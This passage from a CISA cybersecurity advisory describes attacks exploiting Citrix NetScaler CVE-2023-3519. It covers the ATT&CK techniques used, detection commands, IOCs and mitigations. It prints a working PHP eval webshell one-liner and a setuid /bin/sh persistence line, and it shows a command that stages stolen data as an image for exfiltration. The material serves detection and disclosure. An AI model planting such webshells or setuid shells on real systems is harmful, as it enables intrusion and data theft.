Setgid | [T1548\\.001](https://attack.mitre.org/versions/v13/techniques/T1548/001 \"Abuse Elevation Control Mechanism: Setuid and Setgid\") | As part of their initial exploit chain, the threat actors uploaded a TGZ file contain a  `setuid`   binary on the ADC appliance. |\n\n\n\n\n\n\n\n\n\n*Table 6: Cyber Threat Actors ATT\\&CK Techniques for Defense Evasion* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Deobfuscate/Decode Files or Information | [T1140](https://attack.mitre.org/versions/v13/techniques/T1140/ \"Deobfuscate/Decode Files or Information\") | The threat actors deployed the SECRETSAUCE webshell, which can receive PHP code from an  `HTTP POST`   request, decrypt it using an internally embedded RSA public key. |\n| File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | [T1222\\.002](https://attack.mitre.org/versions/v13/techniques/T1222/002/ \"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\") | The threat actors appended  `/flash/nsconfig/rc.netscaler`   with:   `chmod u+s /bin/sh`   `echo \u201c<?php http_response_code(401);@eval(\\$_REQUEST[\u2018variable\u2019]);?>\u201d > /[redacted path to webshell]/[redacted].php`   . |\n| Indicator Removal | [T1070](https://attack.mitre.org/versions/v13/techniques/T1070/ \"Indicator Removal\") | The threat actors deleted log files from Victim 2\\. |\n| Indicator Removal: Clear Linux or Mac System Logs | [T1070\\.002](https://attack.mitre.org/versions/v13/techniques/T1070/002/ \"Indicator Removal: Clear Linux or Mac System Logs\") | The threat actors some access logs, error logs, and authentication logs from Victim 2\\. |\n| Indicator Removal: File Deletion | [T1070\\.004](https://attack.mitre.org/versions/v13/techniques/T1070/004 \"Indicator Removal: File Deletion\") | The threat actors deleted collected files after exfiltrating them. |\n| Masquerading | [T1036](https://attack.mitre.org/versions/v13/techniques/T1036/ \"Masquerading\") | The actor has used the following file names for SECRETSAUCE to appear legitimate:  `vpn[.]php`   ,  `logout[.]php`   ,  `log[.]php`   , and  `prod[.]php`   . |\n| Masquerading: Match Legitimate Name or Location | [T1036\\.005](https://attack.mitre.org/versions/v13/techniques/T1036/005/ \"Masquerading: Match Legitimate Name or Location\") | The threat actors named a webshell  `*logouttm.php*`   . |\n| Masquerading: Masquerade File Type | [T1036\\.008](https://attack.mitre.org/versions/v13/techniques/T1036/008/ \"Masquerading: Masquerade File Type\") | The threat actors exfiltrated data by uploading it as an image file to a web\\-accessible path. |\n\n\n\n\n\n\n\n\n\n*Table 7: Cyber Threat Actors ATT\\&CK Techniques for Credential Access* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Unsecured Credentials: Credentials In Files | [T1552\\.001](https://attack.mitre.org/versions/v13/techniques/T1552/001 \"Unsecured Credentials: Credentials In Files\") | The threat actors obtained encrypted passwords from NetScaler ADC configuration files, and the decryption key was stored on the ADC appliance. |\n| Unsecured Credentials: Private Keys | [T1552\\.004](https://attack.mitre.org/versions/v13/techniques/T1552/004/ \"Unsecured Credentials: Private Keys\") | The threat actors obtained decryption keys to decrypt the AD credential obtained from the NetScaler ADC configuration files. |\n\n\n\n\n\n\n\n\n\n*Table 8: Cyber Threat Actors ATT\\&CK Techniques for Discovery* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Domain Trust Discovery | [T1482](https://attack.mitre.org/versions/v13/techniques/T1482/ \"Domain Trust Discovery\") | The threat actors queried the AD for trusts. |\n| Permission Groups Discovery: Domain Groups | [T1069\\.002](https://attack.mitre.org/versions/v13/techniques/T1069/002/ \"Permission Groups Discovery: Domain Groups\") | The threat actors quired the AD for groups. |\n| Remote System Discovery | [T1018](https://attack.mitre.org/versions/v13/techniques/T1018/ \"Remote System Discovery\") | The threat actors queried the AD for computers.     The threat actors attempted to execute a subnet\\-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets. Network\\-segmentation controls prevented this activity. |\n| System Network Configuration Discovery | [T1016](https://attack.mitre.org/versions/v13/techniques/T1016/ \"System Network Configuration Discovery\") | The actors used a webshell for AD enumeration. |\n| System Network Configuration Discovery: Internet Connection Discovery | [T1016\\.001](https://attack.mitre.org/versions/v13/techniques/T1016/001/ \"System Network Configuration Discovery: Internet Connection Discovery\") | The threat actors attempted to verify outbound network connectivity with a ping command and executed host commands for a subnet\\-wide DNS lookup. Network\\-segmentation controls prevented this activity. |\n| Network Service Discovery | [T1046](https://attack.mitre.org/versions/v13/techniques/T1046/ \"Network Service Discovery\") | The threat actors conducted SMB scanning on the organization\u2019s subnet. |\n| Account Discovery: Domain Account | [T1087\\.002](https://attack.mitre.org/versions/v13/techniques/T1087/002 \"Account Discovery: Domain Account\") | The threat actors queried the AD for users. |\n\n\n\n\n\n\n\n\n\n*Table 9: Cyber Threat Actors ATT\\&CK Techniques for Collection* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Archive Collected Data: Archive via Utility | [T1560\\.001](https://attack.mitre.org/versions/v13/techniques/T1560/001/ \"Archive Collected Data: Archive via Utility\") | The threat actors encrypted discovery data collected via openssl in \u201ctar ball.\u201d    ***Update September 6, 2023:***    The threat actors collected data in gzipped text files.    ***End update*** |\n| Data from Local System | [T1005](https://attack.mitre.org/versions/v13/techniques/T1005 \"Data from Local System\") | The threat actors viewed NetScaler ADC configuration files  `flash/nsconfig/keys/updated/*`   and  `/nsconfig/ns.conf`   . |\n| Data Staged | [T1074](https://attack.mitre.org/versions/v13/techniques/T1074/ \"Data Staged\") | The threat actors uploaded data as an image file to a web\\-accessible path:  `cp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png`   . |\n| Data Staged: Local Data Staging | [T1074\\.001](https://attack.mitre.org/versions/v13/techniques/T1074/001/ \"Data Staged: Local Data Staging\") | The threat actors modified tool wrote captured credentials to a file created in a hard\\-coded path (  `/var/nslog/counters/ prometheus/metrc_codes_client.log`   ). |\n\n\n\n\n\n\n\n\n\n*Table 10: Cyber Threat Actors ATT\\&CK Techniques for Command and Control* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Encrypted Channel: Asymmetric Cryptography | [T1573\\.002](https://attack.mitre.org/versions/v13/techniques/T1573/002/ \"Encrypted Channel: Asymmetric Cryptography\") | The threat actors deployed LIGOLO\\-NG, which is a tunneller that provides encrypted reverse TCP/TLS connections to a remote host. |\n| Ingress Tool Transfer | [T1105](https://attack.mitre.org/versions/v13/techniques/T1105/ \"Ingress Tool Transfer\") | The threat actors exploited CVE\\-2023\\-3519 to upload a TGZ file containing a generic webshell, discovery script, and  `setuid`   binary on the ADC appliance. |\n| Protocol Tunneling | [T1572](https://attack.mitre.org/versions/v13/techniques/T1572/ \"Protocol Tunneling\") | The threat actors deployed LIGOLO\\-NG and NPS tunnellers. |\n| Proxy: Internal Proxy | [T1090\\.001](https://attack.mitre.org/versions/v13/techniques/T1090/001/ \"Proxy: Internal Proxy\") | The actors likely used a PHP shell with proxying capability to attempt proxying SMB traffic to the DC (the traffic was blocked by a firewall and account restrictions). |\n| Proxy: Multi\\-hop Proxy | [T1090\\.003](https://attack.mitre.org/versions/v13/techniques/T1090/003/ \"Proxy: Multi-hop Proxy\") | The threat actors appear to have used compromised pfSense devices to proxy C2 traffic to Victim 2\\. |\n\n\n\n\n\n\n\n\n\n*Table 11: Cyber Threat Actors ATT\\&CK Techniques for Impact* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Account Access Removal | [T1531](https://attack.mitre.org/versions/v13/techniques/T1531/ \"Account Access Removal\") | The threat actors deleted the authorization configuration file (  `/etc/auth.conf`   )\u2014likely to prevent configured users from logging in remotely (e.g., CLI). |\n\n\n\n\n\n\n### **DETECTION METHODS**\n\n\n\n Run the following victim\\-created checks on the ADC shell interface to check for signs of compromise:\n \n\n\n1. Check for files newer than the last installation.\n2. Modify the\n `-newermt` \n parameter with the date that corresponds to your last installation:\n\t* `find /netscaler/ns_gui/ -type f -name *.php -newermt [YYYYMMDD] -exec ls -l {} \\;`\n\t* `find /var/vpn/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;`\n\t* `find /var/netscaler/logon/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;`\n\t* `find /var/python/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;`\n3. Check http error logs for abnormalities that may be from initial exploit:\n\t* `zgrep '\\.sh' /var/log/httperror.log*`\n\t* `zgrep '\\.php' /var/log/httperror.log*`\n4. Check shell logs for unusual\n `post-ex` \n commands, for example:\n\t* `grep '/flash/nsconfig/keys' /var/log/sh.log*`\n5. Look for\n `setuid` \n binaries dropped:\n\t* `find /var -perm -4000 -user root -not -path \"/var/nslog/*\" -newermt [YYYYMMDD] -exec ls -l {} \\;`\n6. Review network and firewall logs for subnet\\-wide scanning of HTTP/HTTPS/SMB (80/443/445\\) originating from the ADC.\n7. Review DNS logs for unexpected spike in internal network computer name lookup originating from the ADC (this may indicate the threat actor resolving host post\\-AD enumeration of computer objects).\n8. Review network/firewall logs for unexpected spikes in AD/LDAP/LDAPS traffic originating from the ADC (this may indicate AD/LDAP enumeration).\n9. Review number of connections/sessions from NetScaler ADC per IP address for excessive connection attempts from a single IP (this may indicate the threat actor interacting with the webshell).\n10. Pay attention to larger outbound transfers from the ADC over a short period of session time as it can be indicative of data exfiltration.\n11. Review AD logs for logon activities originating from the ADC IP with the account configured for AD connection.\n12. If logon restriction is configured for the AD account, check event\n `4625` \n where the failure reason is \u201cUser not allowed to logon at this computer.\u201d\n13. Review NetScaler ADC internal logs (\n `sh.log*` \n ,\n `bash.log*` \n ) for traces of potential malicious activity (some example keywords for\n `grep` \n are provided below):\n\t* `database.php`\n\t* `ns_gui/vpn`\n\t* `/flash/nsconfig/keys/updated`\n\t* `LDAPTLS_REQCERT`\n\t* `ldapsearch`\n\t* `openssl + salt`\n14. Review NetScaler ADC internal access logs (\n `httpaccess-vpn.log*` \n ) for 200 successful access of unknown web resources.\n\n\n##### ***Update September 6, 2023:***\n\n\n\n The following resources may assist with detecting signs of compromise:\n \n\n\n* Mandiant:\n [Exploitation of Citrix Zero\\-Day by Possible Espionage Actors (CVE\\-2023\\-3519\\)](https://www.mandiant.com/resources/blog/citrix-zero-day-espionage \"Exploitation of Citrix Zero-Day by Possible Espionage Actors (CVE-2023-3519)\")\n* GreyNoise:\n [Will the real Citrix CVE\\-2023\\-3519 please stand up?](https://www.greynoise.io/blog/will-the-real-citrix-cve-2023-3519-please-stand-up \"Will the real Citrix CVE-2023-3519 please stand up?\")\n* Shadowserver:\n [Technical Summary of Observed Citrix CVE\\-2023\\-3519 Incidents](https://www.shadowserver.org/news/technical-summary-of-observed-citrix-cve-2023-3519-incidents/ \"Technical Summary of Observed Citrix CVE-2023-3519 Incidents\")\n* Mandiant:\n [Indicators of Compromise Scanner for Citrix ADC Zero\\-Day (CVE\\-2023\\-3519\\)](https://www.mandiant.com/resources/blog/citrix-adc-vulnerability-ioc-scanner \"Indicators of Compromise Scanner for Citrix ADC Zero-Day (CVE-2023-3519)\")\n* ***(Update October 6, 2023\\)***\n IBM:\n [X\\-Force uncovers global NetScaler Gateway credential harvesting campaign](https://securityintelligence.com/posts/x-force-uncovers-global-netscaler-gateway-credential-harvesting-campaign/ \"X-Force uncovers global NetScaler Gateway credential harvesting campaign\")\n\n\n##### ***End Update***\n\n\n\n\n\n\n##### ***Update September 6, 2023***\n :\n\n\n### **INDICATORS OF COMPROMISE**\n\n\n\n See Table 12 for IOCs obtained from Victim 2\\. (Note: a trusted third party observed the same PHP webshell and ELF binary hashes).\n \n\n\n\n\n\n*Table 12: Victim 2\\-provided IOCs Affiliated with Citrix CVE\\-2023\\-3519 Exploitation* \n\n| **File Name** | **Description** | **SHA\\-1 Hash** | **MD5 Hash** |\n| --- | --- | --- | --- |\n| Logouttm\\[.]php | PHP Webshell | 3345ad8b43d6771532ca55acf7e95fe98aeadb27 | 47b8d29319a9e85aaf829f4f2f9c6c00 |\n| pykeygen | ELF Binary | b8f9258e9c7c882944e2b773557b49e5821517fe | ee51f599d266be5fd89b423ca24521f1 |\n\n\n\n\n\n\n\n See Table 13 and Table 14 for IOCs addresses obtained from trusted third parties.\n \n\n\n\n\n\n*Table 13: Third\\-party Provided IP Addresses Affiliated with Citrix CVE\\-2023\\-3519 Exploitation* \n\n| **IP Address** | **Description** | **Date Observed** |\n| --- | --- | --- |\n| 5\\.2\\.64\\[.]155 | Threat actors used this to drop a webshell. | June 12, 2023 |\n| 5\\.255\\.101\\[.]76 | Attempted outbound connection to this C2 observed on a victim. | Late June 2023 |\n| 172\\.94\\.124\\[.]18 | Threat actors used this infrastructure to remote into a victim network. | July 20, 2023 |\n| 154\\.6\\.91\\[.]149 | Threat actors used this infrastructure to remote into a victim network. | July 21, 2023 |\n\n\n\n\n\n\n\n\n\n*Table 14: Third\\-party Provided IOCs Affiliated with Citrix CVE\\-2023\\-3519 Exploitation* \n\n| **File Name** | **Description** | **SHA\\-1 Hash** | **MD5 Hash** |\n| --- | --- | --- | --- |\n| info\\[.]php | PHP Webshell | 55c83cb25be5c521e4874e22b1422c360abf0a29 | c0b32901f9c6ce3f965b8552f7d058d4 |\n| NPS | NPS tunneller \\[  [4](https://github.com/ehang-io/nps)   ] | ec17f7b3acb2334a062c37e0271c31c3c8b6879c | 9b6f12aed2369a99a1132edd2ede779d |\n| the | LIGOLO\\-NG \\[  [3](https://github.com/Nicocha30/ligolo-ng)   ] tunneller | dec36a2aa4ecb86eafd01015e27c06f51d104317 | b383c4ed6712a0a06fb85b1d8405e0f1 |\n\n\n##### ***End Update***\n\n\n\n\n\n\n### **INCIDENT RESPONSE**\n\n\n\n If compromise is detected, organizations should:\n \n\n\n1. Quarantine or take offline potentially affected hosts.\n2. Reimage compromised hosts.\n3. Provision new account credentials.\n4. Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.\n5. Report the compromise to CISA via CISA\u2019s 24/7 Operations Center (\n [report@cisa.gov](mailto:report@cisa.gov \"Report to CISA\") \n or 888\\-282\\-0870\\).\n\n\n##### ***Update September 6, 2023:***\n\n\n\n If the threat actor used /flash/nsconfig/rc.netscaler to make /bin/sh a setuid binary and to rewrite a webshell on every reboot, organizations should clean rc.netscaler to prevent the webshell from getting rewritten by using the following third\\-party created command.\n \n\n\n\n\n| `root@SOME-NETSCALER# cat /flash/nsconfig/rc.netscaler`    `[redacted output]`    `chmod u+s /bin/sh`    `echo \"<?php http_response_code(401);@eval(\\$_REQUEST['variable']);?>\" > /[redacted webshell path]/[redacted].php`      `root@SOME-NETSCALER# cat /[redacted webshell path]/[redacted].php`    `<?php http_response_code(401);@eval($_REQUEST['variable']);?>` |\n| --- |\n\n\n\n\n\n\n### **MITIGATIONS**\n\n\n\n CISA recommends all organizations:\n \n\n\n* **Install the relevant updated version of NetScaler ADC and NetScaler Gateway** \n as soon as possible. See\n [Citrix ADC and Citrix Gateway Security Bulletin for CVE\\-2023\\-3519, CVE\\-2023\\-3466, CVE\\-2023\\-3467](https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467 \"Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\") \n for patch information.\n* **Follow best cybersecurity practices** \n in your production and enterprise environments, including mandating\n [phishing\\-resistant multifactor authentication (MFA)](/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf \"CISA | DEFEND TODAY, SECURE TOMORROW @cisagovFacebook.com/CISA@CISAgov | @cyber | @uscert_govcisa.gov central@cisa.gov Linkedin.com/company/cisagov Implementing Phishing-Resistant MFA\") \n for all staff and for all services. For additional best practices, see CISA\u2019s\n [Cross\\-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals \"Cross-Sector Cybersecurity Performance Goals\") \n (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of information technology (IT) and operational technology (OT) security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and ACSC also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).\n* As a longer\\-term effort,\n **apply robust network\\-segmentation controls on NetScaler appliances** \n , and other internet\\-facing devices.\n\n\n\n\n\n\n### **VALIDATE SECURITY CONTROLS**\n\n\n\n In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT\\&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT\\&CK techniques described in this advisory.\n \n\n\n\n To get started:\n \n\n\n1. Select an ATT\\&CK technique described in this advisory (see Table 1\u2013Table 11\\).\n2. Align your security technologies against the technique.\n3. Test your technologies against the technique.\n4. Analyze your detection and prevention technologies\u2019 performance.\n5. Repeat the process for all security technologies to obtain a set of comprehensive performance data.\n6. Tune your security program, including people, processes, and technologies, based on the data generated by this process.\n\n\n\n CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT\\&CK techniques identified in this advisory.\n \n\n\n\n\n\n\n### **REFERENCES**\n\n\n\n \\[1] Citrix Security Bulletin CTX561482:\n [Citrix ADC and Citrix Gateway Security Bulletin for CVE\\-2023\\-3519, CVE\\-2023\\-3466, CVE\\-2023\\-3467](https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467 \"Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\") \n\n\n\n##### ***Update September 6, 2023:***\n\n\n\n \\[2]\n [GitHub \\- dxkite/php\\-stream\\-shell: a simple stream\\_wrapper shell](https://github.com/dxkite/php-stream-shell \"dxkite / php-stream-shell\") \n\n\n\n\n \\[3]\n [GitHub \\- ssh\\-inject/injectme.c](https://github.com/xpn/ssh-inject/blob/master/injectme.c \"xpn / ssh-inject\") \n\n\n\n\n \\[4]\n [GitHub \\- L\\-codes/Neo\\-reGeorg: Neo\\-reGeorg is a project that seeks to aggressively refactor reGeorg](https://github.com/L-codes/Neo-reGeorg \"L-codes / Neo-reGeorg\") \n\n\n\n\n \\[5]\n [GitHub \\- nicocha30/ligolo\\-ng](https://github.com/Nicocha30/ligolo-ng \"nicocha30 / ligolo-ng\") \n\n\n\n\n \\[6]\n [GitHub \\- ehang\\-io/nps](https://github.com/ehang-io/nps \"ehang-io / nps\") \n\n\n\n\n \\[7] Microsoft:\n [AD Explorer \\- Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer \"Active Directory Explorer v1.52\") \n\n\n\n##### ***End Update***\n\n\n\n\n\n\n##### ***Update September 6, 2023:***\n\n\n### **ACKNOWLEDGEMENTS**\n\n\n\n Mandiant and Shadowserver contributed to this Cybersecurity Advisory.\n \n\n\n##### ***End Update***\n\n\n\n\n\n\n### **VERSION HISTORY**\n\n\n\n**July 20, 2023:** \n Initial version.\n   \n\n**July 24, 2023:** \n Updated affected NetScaler ADC 12\\.1\\-FIPS and NetScaler ADC 12\\.1\\-NDcPP version numbers. Updated Step 3 in Detection Methods to use\n `zgrep` \n instead of\n `grep` \n .\n   \n\n**September 6, 2023:** \n Updates noted throughout.\n   \n\n**September 21, 2023:** \n Removed persistence commands and associated technique for tampering with security tools.\n   \n\n**October 6, 2023:** \n Updated resources in Detection Methods section\n \n\n\n\n\n\n\n\n\n\n\n This product is provided subject to this\n [Notification](/notification \"Follow link\") \n and this\n [Privacy \\& Use](/privacy-policy \"Follow link\") \n policy.\n \n\n\n\n\n\n\n\n\n\n\n\n### Tags\n\n\n\n\n Topics\n \n\n[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience) \n ,\n [Information Sharing](/topics/cyber-threats-and-advisories/information-sharing) \n ,\n [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories) \n\n\n\n\n MITRE ATT\\&CK TTP\n \n\n Defense Evasion (TA0005\\), Collection (TA0009\\), Command and Control (TA0011\\), Credential Access (TA0006\\), Discovery (TA0007\\), Execution (TA0002\\), Impact (TA0040\\), Initial Access (TA0001\\), Persistence (TA0003\\), Privilege Escalation (TA0004\\), Resource Development (TA0042\\)\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease share your thoughts\n--------------------------\n\n\n\n We recently updated our anonymous\n [product survey](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-201a) \n ; we\u2019d welcome your feedback.\n \n\n\n\n\n\n\n\n\n\n\n\n\nRelated Advisories\n------------------\n\n\n\n\n\n\n\n\n\n\n Jul 11, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-193A\n \n\n### [CISA Red Team\u2019s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense\\-in\\-Depth](/news-events/cybersecurity-advisories/aa24-193a)\n\n\n\n\n\n\n\n\n\n\n\n Jul 08, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-190A\n \n\n### [People\u2019s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action](/news-events/cybersecurity-advisories/aa24-190a)\n\n\n\n\n\n\n\n\n\n\n\n May 10, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-131A\n \n\n### [\\#StopRansomware: Black Basta](/news-events/cybersecurity-advisories/aa24-131a)\n\n\n\n\n\n\n\n\n\n\n\n Apr 18, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-109A\n \n\n### [\\#StopRansomware: Akira Ransomware](/news-events/cybersecurity-advisories/aa24-109a)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Return to top](#) \n\n\n\n\n* [Topics](/topics)\n* [Spotlight](/spotlight)\n* [Resources \\& Tools](/resources-tools)\n* [News \\& Events](/news-events)\n* [Careers](/careers)\n* [About](/about)\n\n\n\n\n\n\n\n\n[Cybersecurity \\& Infrastructure Security Agency](/ \"Go to the Cybersecurity & Infrastructure Security Agency homepage\")\n\n\n* [Facebook](https://www.facebook.com/CISA)\n* [Twitter](https://twitter.com/CISAgov)\n* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)\n* [YouTube](https://www.youtube.com/@cisagov)\n* [Instagram](https://www.instagram.com/cisagov)\n* [RSS](/subscribe-updates-cisa)\n\n\n\n\n CISA Central\n \n[1\\-844\\-Say\\-CISA](tel:1-844-Say-CISA) \n[SayCISA@cisa.gov](mailto:SayCISA@cisa.gov) \n\n\n\n\n\n\n\n\n\n\n\n DHS Seal\n \n\n\n CISA.gov\n \n\n An official website of the U.S. Department of Homeland Security\n \n\n\n* [About CISA](/about \"About CISA\")\n* [Budget and Performance](https://www.dhs.gov/performance-financial-reports \"Budget and Performance\")\n* [DHS.gov](https://www.dhs.gov \"Department of Homeland Security\")\n* [Equal Opportunity \\& Accessibility](/oedia \"Equal Opportunity & Accessibility\")\n* [FOIA Requests](https://www.dhs.gov/foia \"FOIA Requests\")\n* [No FEAR Act](/no-fear-act \"No FEAR Act Reporting\")\n* [Office of Inspector General](https://www.oig.dhs.gov/ \"Office of Inspector General\")\n* [Privacy Policy](/privacy-policy \"Privacy Policy\")\n* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 \"Subscribe to Email Updates\")\n* [The White House](https://www.whitehouse.gov/ \"The White House\")\n* [USA.gov](https://www.usa.gov/ \"USA.gov\")\n* [Website Feedback](/forms/feedback \"Website Feedback\")\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "cves": ["CVE-2023-3467", "CVE-2023-3519", "CVE-2023-3466"], "techniques": ["T1070.002", "T1036.005", "T1036.008", "T1588.002", "T1074.001", "T1087.002", "T1505.003", "T1070.004", "T1090.001", "T1059.004", "T1016.001", "T1560.001", "T1069.002", "T1090.003", "T1552.001", "T1548.001", "T1573.002", "T1552.004", "T1222.002"], "advisory": "aa23-201a", "title": "Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells | CISA", "source": "cybersecurity-advisories", "id": "a7e337f1d355511bca3992cf6ec61615fe1b7e27aa8182fa44a72159d121108d"}